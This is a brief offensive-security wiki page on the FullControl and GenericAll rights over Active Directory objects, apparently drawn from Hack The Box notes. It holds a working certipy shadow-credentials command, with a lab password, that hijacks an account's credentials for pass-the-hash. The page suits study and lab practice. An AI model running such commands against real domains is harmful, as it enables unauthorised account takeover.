# FullControl

## Information

{% hint style="success" %}
### GenericAll vs. FullControl

* `GenericAll` is a specific **Active Directory right** that grants **full control over an object**. This includes the ability to read, write, modify, and delete the object and its properties. This is the right typically needed to fully control an AD object.
* `FullControl` is a broader Windows permission concept. When we see it in tools or GUIs (like File Explorer or ACL editors), it usually maps to `GenericAll` for AD objects, but can include some additional flags related to inheritance and specific extended rights.
{% endhint %}

`Full Control` typically refers to the highest level of permissions granted on an object in AD. It allows the user or group to perform all actions on the object, including creating, deleting, modifying, and changing permissions.&#x20;

## Exploitation

### Password Change

Check how [here](forcechangepassword.md).

### Shadow Credential

Get the object's hash and perform a PtH attack.

{% code overflow="wrap" %}
```bash
certipy shadow auto -username oorend@rebound.htb -password '1GR8t@$$4u' -k -account winrm_svc -target dc01.rebound.htb
```
{% endcode %}
